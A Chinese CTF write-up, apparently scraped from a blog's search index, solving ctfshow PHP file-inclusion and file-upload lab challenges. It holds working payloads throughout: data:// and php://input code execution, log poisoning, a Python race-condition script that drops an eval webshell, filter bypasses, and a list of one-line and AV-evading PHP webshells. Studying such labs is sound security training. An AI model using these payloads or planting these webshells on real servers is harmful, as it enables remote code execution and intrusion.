allow_url_include：on POC： data://text/plain,\u003c?php phpinfo();?\u003e //如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入： data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#php协议"},{"categories":["CTF","web"],"content":"\rPHP伪协议\rfile://协议file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。 php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 利用条件: allow_url_fopen ：off/on allow_url_include：off/on 例如有些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码不会直接显示到页面上，则我们可以利用php://filter/convert.base64-encode/resource=文件路径来得到base64编码后的字符串，通过base64解码即可得到php完整源码 php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 利用条件: allow_url_fopen ：off/on allow_url_include：on ZIP://协议zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 zip://中只能传入绝对路径。 要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换） 只需要是zip的压缩包即可，后缀名可以任意更改。 相同的类型还有zlib://和bzip2:// 利用条件: allow_url_fopen ：off/on allow_url_include：off/on POC： zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt data://协议data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。 利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数： 利用条件: allow_url_fopen ：on allow_url_include：on POC： data://text/plain,\u003c?php phpinfo();?\u003e //如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入： data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#zip协议"},{"categories":["CTF","web"],"content":"\rPHP伪协议\rfile://协议file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。 php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 利用条件: allow_url_fopen ：off/on allow_url_include：off/on 例如有些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码不会直接显示到页面上，则我们可以利用php://filter/convert.base64-encode/resource=文件路径来得到base64编码后的字符串，通过base64解码即可得到php完整源码 php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 利用条件: allow_url_fopen ：off/on allow_url_include：on ZIP://协议zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 zip://中只能传入绝对路径。 要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换） 只需要是zip的压缩包即可，后缀名可以任意更改。 相同的类型还有zlib://和bzip2:// 利用条件: allow_url_fopen ：off/on allow_url_include：off/on POC： zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt data://协议data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。 利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数： 利用条件: allow_url_fopen ：on allow_url_include：on POC： data://text/plain,\u003c?php phpinfo();?\u003e //如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入： data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#data协议"},{"categories":["CTF","web"],"content":"\r伪协议利用条件\r","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:4","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#伪协议利用条件"},{"categories":["CTF","web"],"content":"\r文件包含漏洞防护1、使用str_replace等方法过滤掉危险字符 2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中） 3、php版本升级，防止%00截断 4、对上传的文件进行重命名，防止被读取 5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。 6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:5","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#文件包含漏洞防护"},{"categories":["CTF","web"],"content":"\r靶场题目：","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:0","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#靶场题目"},{"categories":["CTF","web"],"content":"\r[web78]php伪协议 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 10:52:43 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 10:54:20 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; include($file); }else{ highlight_file(__FILE__); } 通过php伪协议来读取文件目录： http://44a76034-124a-4121-952d-6773e75c37d4.challenge.ctf.show/?file=data://text/plain,\u003c?php system('ls');?\u003e 读取flag内容： http://44a76034-124a-4121-952d-6773e75c37d4.challenge.ctf.show/?file=data://text/plain,\u003c?php system('cat flag.php');?\u003e 直接cat可能没有回显，通过查看页面源码即可得到flag ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web78php伪协议"},{"categories":["CTF","web"],"content":"\r[web79]php伪协议bypass \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:10:14 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 11:12:38 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(\"php\", \"???\", $file); include($file); }else{ highlight_file(__FILE__); } 法一 替换了payload的中的php，可以构造一下payload： http://58452d9a-e437-4cf8-b189-168ac79426dc.challenge.ctf.show/?file=data://text/plain,\u003c?=system('ls');?\u003e 读取flag.php http://58452d9a-e437-4cf8-b189-168ac79426dc.challenge.ctf.show/?file=data://text/plain,\u003c?=system('tac flag*');?\u003e 法二 可以使用input协议 POST /?file=Php://input HTTP/1.1 \u003c?Php system(\"ls\");?\u003e POST /?file=Php://input HTTP/1.1 \u003c?Php system(\"cat flag.php\");?\u003e 法三 data协议+base64加密 /?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw== # \u003c?php system('ls'); /?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= # \u003c?php system('cat flag.php'); ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:2","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web79php伪协议bypass"},{"categories":["CTF","web"],"content":"\r[web80]php伪协议POST \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 11:26:29 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(\"php\", \"???\", $file); $file = str_replace(\"data\", \"???\", $file); include($file); }else{ highlight_file(__FILE__); } 又替换了php，我们可以使用input协议，首先打开burpsuite开启拦截，然后在HackBar发POST包： http://164bc5d8-06d4-4422-b19f-3ca65d68f6ef.challenge.ctf.show/?file=PHP://input 然后在bp拦截的报文末尾添加POST传参内容 \u003c?php system('ls');?\u003e 发包后发现fl0g.php文件 重复上述操作，修改POST传参中的命令 \u003c?php system('tac fl0g.php');?\u003e 得到flag内容： ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web80php伪协议post"},{"categories":["CTF","web"],"content":"\r[web81]日志包含 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 15:51:31 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(\"php\", \"???\", $file); $file = str_replace(\"data\", \"???\", $file); $file = str_replace(\":\", \"???\", $file); include($file); }else{ highlight_file(__FILE__); } php、data、：（冒号）都失效了 可以读取日志信息 在url后面加入日志文件的路径 ?file=/var/log/nginx/access.log 进行两次发包，第一次将User-Agent修改为 \u003c?php system('ls');?\u003e 得到回显之后进行第二次发包，随后得到 得到flag存放的具体文件，随后进行第三次发包 跟第一次发包类似，将User-Agent改为\u003c?php system('tac fl0g.php');?\u003e发包后可得到flag ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:4","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web81日志包含"},{"categories":["CTF","web"],"content":"\r[web82]条件竞争 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 19:34:45 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(\"php\", \"???\", $file); $file = str_replace(\"data\", \"???\", $file); $file = str_replace(\":\", \"???\", $file); $file = str_replace(\".\", \"???\", $file); include($file); }else{ highlight_file(__FILE__); } ​ 过滤了点之后我们也不能使用文件包含来getshell了，因此我们只能利用无后缀的文件，因为在php中我们能够利用的无后缀的文件就是session，我们可以利用session.upload_progress来进行文件包含，利用PHP_SESSION_UPLOAD_PROGRESS参数 前瞻知识 该功能是在php5.4添加的，首先先了解下php.ini以下的几个默认选项 session.upload_progress.enable = on session.upload_progress.cleanup = on session.upload_progress.prefix = \"upload_progress_\" session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\" enable = on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ； cleanup = on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要； name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控； prefix+name将表示为session中的键名; 另外还有一个session配置中的重要选项：session.use_strict_mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。 过程分析 如果session.auto_start=on，则php会在接收请求的时候会自动初始化Session，不再需要执行session_start()。 但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=rikka，PHP将会在服务器上创建一个文件/tmp/sess_rikka。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里； 简而言之，我们自定义的PHPSESSID的值会变成文件名，比如定义PHPSESSID:rikka，文件名即为/tmp/sess_rikka，而PHP_SESSION_UPLOAD_PROGRESS的值即为该文件的内容 可以直接用脚本进行发包 import requests import threading import io url = \"http://522071b1-f31d-4623-80b8-334e5e39b8b4.challenge.ctf.show/\" sessID = 'rikka' data = { \"1\": \"file_put_contents('/var/www/html/1.php', '\u003c?php eval($_POST[2]);?\u003e');\" # read()中需要post的内容 } def write(session): fileBytes = io.BytesIO(b'a' * 1024 * 50) while True: res = session.post(url, data={ 'PHP_SESSION_UPLOAD_PROGRESS': '\u003c?php eval($_POST[1]);?\u003e' # 改参数的值就是/tmp/sess_rikka文件的内容 }, cookies={ \"PHPSESSID\": sessID }, files={ 'file': ('rikka.png', fileBytes) } ) def read(session): while True: res1 = session.post(url + '?file=/tmp/sess_' + sessID, data=data, cookies={ \"PHPSESSID\": sessID }) res2 = session.get(url+'1.php') if res2.status_code == 200: print(\"+++done+++\") else: print(res2.status_code) if __name__ == '__main__': event = threading.Event() # 开启多线程的对象 with requests.session() as session: for i in range(5): # 开5个线程 threading.Thread(target=write, args=(session,)).start() for i in range(5): threading.Thread(target=read, args=(session,)).start() event.set() # 唤醒线程 成功后访问http://522071b1-f31d-4623-80b8-334e5e39b8b4.challenge.ctf.show/1.php然后POST发包进行命令执行 下面这种方法比较麻烦： 构造一个文件上传的表单， \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003cbody\u003e \u003cform action=\"http://522071b1-f31d-4623-80b8-334e5e39b8b4.challenge.ctf.show/\" method=\"POST\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /\u003e \u003cinput type=\"file\" name=\"file\" /\u003e \u003cinput type=\"submit\" value=\"submit\" /\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 上传1.php文件同时抓包，添加 Cookie :PHPSESSID=flag session文件的位置我们根据上文的常见的几个测试，在/tmp/sess_PHPSESSID下成功访问且不报错，说明在/tmp/sess_PHPSESSID目录下, 所以PHP将会在服务器上创建一个文件：/tmp/sess_flag” 然后我们在PHP_SESSION_UPLOAD_PROGRESS下添加我们的执行代码，修改如下 因为我们在上面这个页面添加的ID值是flag，所以传参?file=/tmp/sess_flag,抓包 修改如下：这个a是随便加的，主要是为了方便爆破 两个包payload设置如下 条件竞争，将POST的包和传file的包都开启爆破，即可得到目录 修改传参内容，得到flag ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:5","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web82条件竞争"},{"categories":["CTF","web"],"content":"\r[web83]~[web86]web82的脚本都可以解 [web84] 方法与web82一样，虽然session被删除了，但请求线程比较多，刚删掉就又写进去了 [web85] 检查file的内容是否包含\u003c，web82脚本方法可行 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:6","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web83web86"},{"categories":["CTF","web"],"content":"\r[web87]bypass \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 21:57:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; $content = $_POST['content']; $file = str_replace(\"php\", \"???\", $file); $file = str_replace(\"data\", \"???\", $file); $file = str_replace(\":\", \"???\", $file); $file = str_replace(\".\", \"???\", $file); file_put_contents(urldecode($file), \"\u003c?php die('大佬别秀了');?\u003e\".$content); }else{ highlight_file(__FILE__); } ​ file_put_contents() 函数用于把字符串写入文件，成功返回写入到文件内数据的字节数，失败则返回 FALSE。 ​ file_get_contents() 把整个文件读入一个字符串中。 该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。 ​ 类似函数：fopen() 函数打开一个文件或 URL。区别是fopen()打开网页后，返回的不是字符串，不能直输出的，还需要用到fgets()这个函数来获取字符串。fgets()函数是从文件指针中读取一行。文件指针必须是有效的，必须指向由 fopen() 或 fsockopen() 成功打开的文件(并还未由 fclose() 关闭)。 死亡绕过： 原理不外乎是将死亡或者杂糅代码分解成php无法识别的代码 base64编码绕过利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。 当$content被加上了\u003c?php die('大佬别秀了');?\u003e以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符\u003c、?、;、\u003e、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符 base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符 “phpdieaa\"被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是\u003c?php die('大佬别秀了');?\u003e没有了。 file=php://filter/write=convert.base64-decode/resource=shell.php 对文件名进行url解码后再用file_put_contents写入，通过把p换成%2570（%2570—\u003e%70—\u003ep）绕过对php的过滤 file=%2570hp%253A%2F%2Ffilter%2Fwrite%3Dconvert%252Ebase64-decode%2Fresource%3Dshell%252E%2570hp 然后post发包 content=\u003c?php system($_GET[1]);?\u003e content=aaPD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg== 访问shell.php rce得到flag ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:7","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web87bypass"},{"categories":["CTF","web"],"content":"\r[web87]bypass \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 21:57:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; $content = $_POST['content']; $file = str_replace(\"php\", \"???\", $file); $file = str_replace(\"data\", \"???\", $file); $file = str_replace(\":\", \"???\", $file); $file = str_replace(\".\", \"???\", $file); file_put_contents(urldecode($file), \"\u003c?php die('大佬别秀了');?\u003e\".$content); }else{ highlight_file(__FILE__); } ​ file_put_contents() 函数用于把字符串写入文件，成功返回写入到文件内数据的字节数，失败则返回 FALSE。 ​ file_get_contents() 把整个文件读入一个字符串中。 该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。 ​ 类似函数：fopen() 函数打开一个文件或 URL。区别是fopen()打开网页后，返回的不是字符串，不能直输出的，还需要用到fgets()这个函数来获取字符串。fgets()函数是从文件指针中读取一行。文件指针必须是有效的，必须指向由 fopen() 或 fsockopen() 成功打开的文件(并还未由 fclose() 关闭)。 死亡绕过： 原理不外乎是将死亡或者杂糅代码分解成php无法识别的代码 base64编码绕过利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。 当$content被加上了\u003c?php die('大佬别秀了');?\u003e以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符\u003c、?、;、\u003e、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符 base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符 “phpdieaa\"被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是\u003c?php die('大佬别秀了');?\u003e没有了。 file=php://filter/write=convert.base64-decode/resource=shell.php 对文件名进行url解码后再用file_put_contents写入，通过把p换成%2570（%2570—\u003e%70—\u003ep）绕过对php的过滤 file=%2570hp%253A%2F%2Ffilter%2Fwrite%3Dconvert%252Ebase64-decode%2Fresource%3Dshell%252E%2570hp 然后post发包 content=\u003c?php system($_GET[1]);?\u003e content=aaPD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg== 访问shell.php rce得到flag ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:7","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#base64编码绕过"},{"categories":["CTF","web"],"content":"\r[web88]伪协议编码 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-17 02:27:25 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; if(preg_match(\"/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\", $file)){ die(\"error\"); } include($file); }else{ highlight_file(__FILE__); } 对file的参数进行了过滤 可以使用php data协议?file=data://text/plain;base64, 来传入\u003c?php system('tac fl0g.php'); ?\u003e 传参的时候需要对php代码进行base64编码 编码后的字符串含有等于号，删掉就可以了 payload: http://65b019f9-acd9-46fa-afae-e470af533a11.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:8","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web88伪协议编码"},{"categories":["CTF","web"],"content":"\r[web116]web文件上传+misc mp4视频下载下来之后，放入010发现末尾又疑似png文件尾 顺势搜索png文件头89504E47 将这块数据摘取出来，得到php代码 浏览器页面无回显，通过bp抓包发现可以读取文件 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web116"},{"categories":["CTF","web"],"content":"\r[web117]绕过die \u003c?php /* # -*- coding: utf-8 -*- # @Author: yu22x # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-10-01 18:16:59 */ highlight_file(__FILE__); error_reporting(0); function filter($x){ if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){ die('too young too simple sometimes naive!'); } } $file=$_GET['file']; $contents=$_POST['contents']; filter($file); file_put_contents($file, \"\u003c?php die();?\u003e\".$contents); 考察点：绕过死亡die 题目中过滤了很多协议和编码方式，但是除了我们常用的base64和rot13还是有很多方法可以绕过die的 支持的字符编码 php://filter的各种过滤器 可以使用 UCS-2LE UCS-2BE，将字符两位两位进行交换，可以在本地进行测试 payload: ?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=5.php post: post:contents=?\u003chp pvela$(P_SO[T]1;)\u003e? 然后读取flag （一开始把一句话木马写到flag.php里面把flag字符串覆盖掉了，到处早不到flag）QWQ……… ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web117绕过die"},{"categories":["CTF","web"],"content":"ctfshow文件上传专题 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:0:0","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#"},{"categories":["CTF","web"],"content":"\r总结：CTF中文件上传及文件包含总结 CTF文件上传漏洞总结 文件上传马儿总结： 短标签马儿： 一般的马儿： \u003c?php eval（$_POST['cmd']);?\u003e 没有PHP的马儿 \u003c?= eval（$_POST['cmd']);?\u003e \u003c? eval（$_POST['cmd']);?\u003e \u003c% eval（$_POST['cmd']);%\u003e 有PHP的马儿 \u003cscript language=\"php\"\u003e\u003c/script\u003e 特殊马儿： 过滤[]：用{}代替 \u003c?= eval（$_POST['cmd']);?\u003e 直接拿flag的变形马儿 \u003c? echo `tac /var/www/html/f*`;?\u003e \u003c? echo `tac /var/www/html/f*`?\u003e 免杀马儿： \u003c?php $a = \"s#y#s#t#e#m\"; $b = explode(\"#\",$a); $c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5]; $c($_REQUEST[1]); ?\u003e \u003c?php $a=substr('1s',1).'ystem'; $a($_REQUEST[1]); ?\u003e \u003c?php $a=substr('1s',1).'ystem'; $a($_REQUEST[1]); ?\u003e \u003c?php $a=substr('1s',1).'ystem'; $a($_REQUEST[1]); ?\u003e ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:1:0","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#总结"},{"categories":["CTF","web"],"content":"\r靶场题目：","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:0","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#靶场题目"},{"categories":["CTF","web"],"content":"\r[web151]前端校验文件类型前端校验文件类型，上传png图片马 再通过bp抓包修改文件后缀，蚁剑连接 修改后缀为php 蚁剑连接读flag ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web151前端校验文件类型"},{"categories":["CTF","web"],"content":"\r[web152]后端验证Content-Type后端验证实际上是验证Content-Type ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:2","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web152后端验证content-type"},{"categories":["CTF","web"],"content":"\r[web153].user.ini.user.ini 原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。 注： auto_append_file在木马文件上传后上传 auto_prepend_file在木马文件上传前上传 这道题按照前面两种方法无法上传 后面加了png头文件，php大写可以上传，但是蚁剑无法连接，用php3也不行 url上输入 /upload/ 显示了nothing here表示可以用配置文件（因为upload目录下有php文件） 以这样的方式上传，再改包，不然上传不了 然后直接上传写了一句话木马的png 上传成功后用蚁剑连接 http://1db86d8a-c57c-4b7f-b60c-2efd317295cc.challenge.ctf.show/upload/index.php 当然当我们再次访问/upload时： ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web153userini"},{"categories":["CTF","web"],"content":"\r[web154]短标签上题思路可解 如果带木马的不行，然后就更换短标签一个个试 \u003c?= eval($_POST[1]);?\u003e web155(内容过滤php)同上 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:4","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web154短标签"},{"categories":["CTF","web"],"content":"\r[web156][]过滤过滤了文件内的[],可以改成{}来绕过 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:5","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web156过滤"},{"categories":["CTF","web"],"content":"\r[web157]bypass经测试，对文件内容过滤了 php、[、{、 ; 上传.user.ini php 最后的语句也可以不加分号的，前提是得有 ?\u003e结束标志。 修改图片马的内容 \u003c?=system('ls ../')?\u003e 通过ls查看flag文件的位置，写入之后访问/upload/index.php查看回显 使用cat或tac读取信息 \u003c?=system('cat ../*')?\u003e web158思路同上 web159过滤了括号(),我们可以用反引号来代替system() \u003c?=`cat ../*`?\u003e ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:6","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web157bypass"},{"categories":["CTF","web"],"content":"\r[web160]bypass``过滤了反引号，我们可以包含日志 \u003c?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?\u003e 但发现 log也被过滤了，可以使用\"\"来拼接 尝试一句话木马UA头：\u003c?php eval($_POST[x]);?\u003e 上述UA头会引发报错，尝试\u003c?php system('ls');?\u003e 有预期回显，进一步修改： \u003c?php system('ls ../');?\u003e 确定flag.php的位置，tac读取flag \u003c?php system('tac ../flag.phpS');?\u003e ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:7","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web160bypass"},{"categories":["CTF","web"],"content":"\r[web161]检测文件头检测文件头 上传 GIF89a成功绕过 其余思路同上 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:8","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web161检测文件头"},{"categories":["CTF","web"],"content":"\r[web162].bypass-竞争上传检测了文件头，同时过滤了点. session包含 **条件竞争：**我们上传的文件如果不符合要求，就会被删除，导致成功上传无法访问，没有用。但是如果我们上传的速度比服务器删的速度快，就可以了。 修改ini文件内容 .user.ini: GIF89a auto_prepend_file=a 随后修改并上传a文件： GIF89a \u003c?=include\"/tmp/sess_fllag\"?\u003e 构造，session文件竞争包含poc: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003cbody\u003e \u003cform action=\"http://58b10a1f-08e0-4689-8b64-2e8641d2948b.chall.ctf.show/\" method=\"POST\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"2333\" /\u003e \u003cinput type=\"file\" name=\"file\" /\u003e \u003cinput type=\"submit\" value=\"submit\" /\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e Cookie:PHPSESSID=fllag 2333\u003c?php $code='\u003c?php eval($_POST[1]);?\u003e;file_put_contents('a.php',$code);?\u003e 也可以远程包含自己vps上的马 